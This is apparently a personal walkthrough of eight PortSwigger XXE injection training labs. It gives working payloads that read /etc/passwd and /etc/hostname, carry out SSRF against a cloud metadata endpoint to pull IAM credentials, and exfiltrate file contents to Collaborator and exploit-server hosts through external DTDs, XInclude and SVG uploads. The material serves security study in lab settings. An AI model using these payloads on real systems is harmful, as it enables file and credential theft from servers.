---
created: 2026-05-08
tags:
  - walkthrough
---

| `#`  | Solved? | Name                                                                   | Date    | Notes         |
| ---- | ------- | ---------------------------------------------------------------------- | ------- | ------------- |
| `1.` | `✓`     | Exploiting XXE using external entities to retrieve files               | `23.06` |               |
| `2.` | `✓`     | Exploiting XXE to perform SSRF attacks                                 | `23.06` |               |
| `3.` | `✓`     | Blind XXE with out-of-band interaction                                 | `23.06` | #Collaborator |
| `4.` | `✓`     | Blind XXE with out-of-band interaction via XML parameter entities      | `23.06` | #Collaborator |
| `5.` | `✓`     | Exploiting blind XXE to exfiltrate data using a malicious external DTD | `23.06` |               |
| `6.` | `✓`     | Exploiting blind XXE to retrieve data via error messages               | `23.06` |               |
| `7.` | `✓`     | Exploiting XInclude to retrieve files                                  | `23.06` |               |
| `8.` | `✓`     | Exploiting XXE via image file upload                                   | `23.06` |               |


## 1. Exploiting XXE using external entities to retrieve files

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Exploiting XXE using external entities to retrieve files`](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)
> - Level: #Apprentice 
> 
> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
> 
> To solve the lab, inject an XML external entity to retrieve the contents of the `/etc/passwd` file.
### Solution

- Navigate to any product and click `Check stock`. Inspect the request:

![[images/walkthrough/PortSwigger/XXE injection/lab1/1.png]]

- The request parameters, `productId` and `storeId`, are sent in XML. 
- This is how it looks like in JavaScript (`/resources/js/xmlStockCheckPayload.js`):

```js
window.contentType = 'application/xml';

function payload(data) {
    var xml = '<?xml version="1.0" encoding="UTF-8"?>';
    xml += '<stockCheck>';

    for(var pair of data.entries()) {
        var key = pair[0];
        var value = pair[1];

        xml += '<' + key + '>' + value + '</' + key + '>';
    }

    xml += '</stockCheck>';
    return xml;
}
```

- Send the check stock request to `Repeater`.
- To probe for XXE injection, add a `DOCTYPE` declaration with an XML entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY entity "XXE injection!">
]>
<stockCheck><productId>&entity;</productId><storeId>1</storeId></stockCheck>
```

- Send the request:

![[images/walkthrough/PortSwigger/XXE injection/lab1/2.png]]

- Test the `Check stock` functionality:

![[images/walkthrough/PortSwigger/XXE injection/lab1/2.png]]

- The entity value you injected, `XXE injection!`, is reflected in the application error message. 
- Modify the injected entity to point to `/etc/passwd`:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

- Send the request. The response includes the contents of the `/etc/passwd` file:

![[images/walkthrough/PortSwigger/XXE injection/lab1/3.png]]

![[images/walkthrough/PortSwigger/XXE injection/lab1/solved.png]]

Solved!
## 2. Exploiting XXE to perform SSRF attacks

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Exploiting XXE to perform SSRF attacks`](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf)
> 
> - Level: #Apprentice 
> 
> This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.
> 
> The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is `http://169.254.169.254/`. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
> 
> To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

### Solution

- Test the `Check stock` functionality and see XML data again. Send this request to `Repeater`. 
- First probe for injection using the payload:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY entity "XXE injection!">
]>
<stockCheck><productId>&entity;</productId><storeId>1</storeId></stockCheck>
```

![[images/walkthrough/PortSwigger/XXE injection/lab2/1.png]]

- Once the injection is confirmed, test for SSRF. Inject a `Collaborator` endpoint:


```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY ssrf SYSTEM "http://prk9re56ygi7g0qp4jzp0926jxpode13.oastify.com">
]>
<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>
```

![[images/walkthrough/PortSwigger/XXE injection/lab2/2.png]]

- The application includes your `Collaborator` domain in response. In Burp, go to `Collaborator` -> `Poll now`. Observe interactions:

![[images/walkthrough/PortSwigger/XXE injection/lab2/3.png]]

- This means you caused a parser to make an arbitrary external HTTP request. 
- Check if you can access an internal cloud metadata endpoint at `http://169.254.169.254/`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/">
]>
<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>
```

```
"Invalid product ID: latest"
```

![[images/walkthrough/PortSwigger/XXE injection/lab2/4.png]]

- Add `latest` as a URL path and make the request again: 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest">
]>
<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>
```

```xml
"Invalid product ID: meta-data"
```

![[images/walkthrough/PortSwigger/XXE injection/lab2/5.png]]

- Add `meta-data` to the path as well and make another request. This way, using a sequence of requests, discover the complete path to administrator credentials: 

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>
```

- The application returns a JSON structure with credentials:

```json
Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2026-06-23T09:49:13.397596801Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "d1oEXFsp2AOE48ZB7rsN",
  "SecretAccessKey" : "RiRptCUpWPKoFhISZ1ZE5aTl5qqRxAS3IjkYuXYe",
  "Token" : "K67L4K13v2kdOQwaSntzPsteuxYoK06BEbdSlOELFy7jVu7wlg1CKTfrBKlmaBsBOD1cZ31RJDFV8Cutx6TqsmOBVgT6jmShMvEfY8tl1kFhlreqdFiInyE0TM9NANlnUG0XysXnrPTy7b3EJGZTISql6llxq8N6od2iwRSsGfelnPoszX7VVSr0DokruDsREcUFp6l7KDKNohRT3QAtD5F1xEEtLgssRusr4dTxI2sUiF4jr9fzZmJpUBssM5Mt",
  "Expiration" : "2032-06-21T09:49:13.397596801Z"
}
```

![[images/walkthrough/PortSwigger/XXE injection/lab2/6.png]]

![[images/walkthrough/PortSwigger/XXE injection/lab2/solved.png]]

Solved!
## 3. Blind XXE with out-of-band interaction

>[!warning] #Collaborator Burp Collaborator (Professional Edition) is required to solve this lab.

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Blind XXE with out-of-band interaction`](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
> - Level: #Practitioner 
> 
> This lab has a "Check stock" feature that parses XML input but does not display the result.
> 
> You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
> 
> To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
### Solution


- Test the `Check stock` functionality and see XML data again. Send this request to `Repeater`. 
- First probe for injection using the payload:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY entity "XXE injection!">
]>
<stockCheck><productId>&entity;</productId><storeId>1</storeId></stockCheck>
```

![[images/walkthrough/PortSwigger/XXE injection/lab3/1.png]]

- The application doesn't reflect the value of the XML entity in response. This means either the injection is blind or the application is not vulnerable.
- Send an OOB detection probe:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY ssrf SYSTEM "http://vnmfnk1cumedc6mv0pvvwfycf3lu9lxa.oastify.com">
]>
<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>
```

![[images/walkthrough/PortSwigger/XXE injection/lab3/2.png]]

- Then go to `Collaborator` and `Poll now`:

![[images/walkthrough/PortSwigger/XXE injection/lab3/3.png]]

- Detect interactions. Even though the injection is blind, you are able to make the XML parser send HTTP and DNS requests to your controlled domain.

![[images/walkthrough/PortSwigger/XXE injection/lab3/solved.png]]

Solved!
## 4. Blind XXE with out-of-band interaction via XML parameter entities

>[!warning] #Collaborator Burp Collaborator (Professional Edition) is required to solve this lab.

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Blind XXE with out-of-band interaction via XML parameter entities`](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities)
> - Level: #Practitioner 
> 
> This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
> 
> To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

### Solution


- Test the `Check stock` functionality and see XML data again. Send this request to `Repeater`. 
- Try an OOB detection probe as in the previous lab:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY ssrf SYSTEM "http://7z7rzwdo6yqpoiy7c1778raorfx6ly9n.oastify.com">
]>
<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>
```

- The application responds with an error: `"Entities are not allowed for security reasons"`:

![[images/walkthrough/PortSwigger/XXE injection/lab4/1.png]]

- Since external entities are blocked, try parameter entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
	<!ENTITY % ssrf SYSTEM "http://ozr8zdd56fq6ozyoci7o88a5rwxnlg95.oastify.com"> 
	%ssrf; 
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```


- The application responds with `"XML parsing error"`:

![[images/walkthrough/PortSwigger/XXE injection/lab4/2.png]]

- Go to `Collaborator` -> `Poll now`. Detect OOB interactions:

![[images/walkthrough/PortSwigger/XXE injection/lab4/3.png]]

- This means parameter entities bypassed filtering and made the XML parser send HTTP request to your `Collaborator` domain.

![[images/walkthrough/PortSwigger/XXE injection/lab4/solved.png]]

Solved!
## 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD`](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration)
> - Level: #Practitioner 
> 
> 
> This lab has a "Check stock" feature that parses XML input but does not display the result.
> 
> To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

### Solution

- Test the `Check stock` functionality and see XML data again. Send this request to `Repeater`. 
- Try an OOB detection probe as in the previous lab:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY ssrf SYSTEM "http://nwn7wca43en5lyvn9h4n5774ovumig65.oastify.com">
]>
<stockCheck><productId>&ssrf;</productId><storeId>1</storeId></stockCheck>
```

- The application responds with an error: `"Entities are not allowed for security reasons"`:

![[images/walkthrough/PortSwigger/XXE injection/lab5/1.png]]

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
	<!ENTITY % ssrf SYSTEM "http://wmmgml0dtndeb7lwzquwvgxde4kv8qwf.oastify.com"> 
	%ssrf; 
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- See an `"XML parsing error"`.

![[images/walkthrough/PortSwigger/XXE injection/lab5/2.png]]

- Go to `Collaborator` -> `Poll now`. Detect interactions:

![[images/walkthrough/PortSwigger/XXE injection/lab5/3.png]]

- The goal is to retrieve the contents of the `/etc/hostname` file.
- One way to do that is to include the contents of the file as a URL parameter of an HTTP request the XML parser sends to `Collaborator`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://39an9snkgu0lye83mxh3inkk1b72vyjn.oastify.com/?x=%file;'>">
  %eval;
  %exfiltrate;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- You get an error again: `"Entities are not allowed for security reasons"`:

![[images/walkthrough/PortSwigger/XXE injection/lab5/4.png]]

- So, inline `DOCTYPE` doesn't work. But what if you hosted the DTD on your exploit server and then made XML parser fetch and use it? This is possible since you've already confirmed that the parser can make arbitrary external HTTP requests. 
- Host the DTD on your exploit server (without `DOCTYPE`, just its content):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://39an9snkgu0lye83mxh3inkk1b72vyjn.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;
```

![[images/walkthrough/PortSwigger/XXE injection/lab5/5.png]]

- `Store` the exploit. Then click `View exploit` and save the URL:

```
https://exploit-0a6600ca04d7f5d680bfbb3c016d001f.exploit-server.net/exploit.dtd
```

![[images/walkthrough/PortSwigger/XXE injection/lab5/6.png]]

- Place the following into the `Check stock` request:

```
<!DOCTYPE xxe [
	<!ENTITY % ssrf SYSTEM "https://exploit-0a6600ca04d7f5d680bfbb3c016d001f.exploit-server.net/exploit.dtd"> 
	%ssrf;
]>
```

- See `"XML parsing error"`:

![[images/walkthrough/PortSwigger/XXE injection/lab5/7.png]]

- Go to `Collaborator` -> `Poll now`. 
- See an HTTP request to `Collaborator` with the `x` parameter carrying a value, the target hostname from `/etc/hostname`:

![[images/walkthrough/PortSwigger/XXE injection/lab5/8.png]]

- Submit this value as a lab solution.

![[images/walkthrough/PortSwigger/XXE injection/lab5/solved.png]]

Solved!

## 6. Exploiting blind XXE to retrieve data via error messages

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting blind XXE to retrieve data via error messages`](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages)
> - Level: #Practitioner 
> 
> This lab has a "Check stock" feature that parses XML input but does not display the result.
> 
> To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.
> 
> The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.

### Solution

- Test the `Check stock` functionality and see XML data again. Send this request to `Repeater`. 
- Try to retrieve the `/etc/passwd` file using an XML external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck><productId>&file;</productId><storeId>1</storeId></stockCheck>
```

- The application responds with an error: `"Entities are not allowed for security reasons"`:

![[images/walkthrough/PortSwigger/XXE injection/lab6/1.png]]


- Since external entities are blocked, try parameter entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file:///invalid/%file;'>"> 
  %eval;
  %exfiltrate;
]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- Encounter the same error as before:

![[images/walkthrough/PortSwigger/XXE injection/lab6/2.png]]

- Instead of inline DTD, try external DTD. 
- Host the following on your exploit server:

```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

![[images/walkthrough/PortSwigger/XXE injection/lab6/3.png]]

- Click `Store` and `View exploit`. Copy the URL.

```
https://exploit-0a59008703f113c480e9fc1c01b700b4.exploit-server.net/exploit.dtd
```

![[images/walkthrough/PortSwigger/XXE injection/lab6/4.png]]

- Payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE injection [
	<!ENTITY % xxe SYSTEM "https://exploit-0a59008703f113c480e9fc1c01b700b4.exploit-server.net/exploit.dtd"> 
	%xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

- The application includes the content of the `/etc/passwd` file in response:

![[images/walkthrough/PortSwigger/XXE injection/lab6/5.png]]


![[images/walkthrough/PortSwigger/XXE injection/lab6/solved.png]]

Solved!
## 7. Exploiting XInclude to retrieve files

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting XInclude to retrieve files`](https://portswigger.net/web-security/xxe/lab-xinclude-attack)
> - Level: #Practitioner 
> 
> This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
> 
> Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
> 
> To solve the lab, inject an `XInclude` statement to retrieve the contents of the `/etc/passwd` file.
### Solution

- Go to any product and test the `Check stock` functionality:

![[images/walkthrough/PortSwigger/XXE injection/lab7/1.png]]

- See that parameters are not send as XML elements anymore. However, them may be parsed into XML on the back-end. 
- But in this case you can't just inject a `DOCTYPE` declaration with XML entities you need, since you don't control the start of the document.
- In this case, you can use `XInlude` statement injection:

```xml
<xxe xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></xxe>
```

- Payload:

```
productId=%3cxxe%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2fxxe%3e&storeId=1
```

![[images/walkthrough/PortSwigger/XXE injection/lab7/2.png]]

- The application returns the content of the `/etc/passwd` file in response:

![[images/walkthrough/PortSwigger/XXE injection/lab7/3.png]]

![[images/walkthrough/PortSwigger/XXE injection/lab7/solved.png]]

Solved!
## 8. Exploiting XXE via image file upload

>[!done]

>[!note]+ Lab description
> - [`Lab: Exploiting XXE via image file upload`](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
> - Level: #Practitioner 
> 
> This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
> 
> To solve the lab, upload an image that displays the contents of the `/etc/hostname` file after processing. Then use the "Submit solution" button to submit the value of the server hostname.

### Solution

- Navigate to any post and see avatar upload functionality in the comment section:

![[images/walkthrough/PortSwigger/XXE injection/lab8/1.png]]

- Submit a comment with an SVG image as an avatar. See the application accepts it:

![[images/walkthrough/PortSwigger/XXE injection/lab8/2.png]]

- Send this request to `Repeater` and replace the image XML with the payload:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
<text font-size="16" x="0" y="16">&xxe;</text></svg>
```

![[images/walkthrough/PortSwigger/XXE injection/lab8/3.png]]

- Go back to the post and navigate to the avatar from your comment:

![[images/walkthrough/PortSwigger/XXE injection/lab8/4.png]]

- See it embeds the hostname inside the image, despite SVG being converted to PNG.
- Submit this value as a solution.

![[images/walkthrough/PortSwigger/XXE injection/lab8/solved.png]]

Solved!